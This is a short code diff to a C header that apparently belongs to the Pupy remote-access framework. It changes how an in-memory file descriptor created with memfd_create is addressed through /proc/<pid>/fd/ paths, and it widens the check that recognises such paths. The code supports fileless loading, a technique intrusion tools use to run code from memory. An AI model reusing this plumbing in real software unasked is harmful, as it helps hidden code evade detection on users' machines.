@@ -25,7 +25,8 @@
 #define F_SEAL_WRITE   0x0008
 #endif
 
-#define MEMFD_FILE_PATH "/proc/self/fd/"
+#define PROCFS_PATH "/proc/"
+#define MEMFD_FILE_PATH PROCFS_PATH "%d/fd/"
 
 inline static int pupy_memfd_create(char *path, unsigned int path_size)
 {
@@ -40,13 +41,13 @@ inline static int pupy_memfd_create(char *path, unsigned int path_size)
         return -1;
     }
 
-    snprintf(path, path_size, MEMFD_FILE_PATH "%d", fd);
+    snprintf(path, path_size, MEMFD_FILE_PATH "%d", getpid(), fd);
     return fd;
 }
 
 inline static bool is_memfd_path(const char *path)
 {
-    return !strncmp(path, MEMFD_FILE_PATH, strlen(MEMFD_FILE_PATH));
+    return !strncmp(path, PROCFS_PATH, strlen(PROCFS_PATH));
 }
 
 #endif
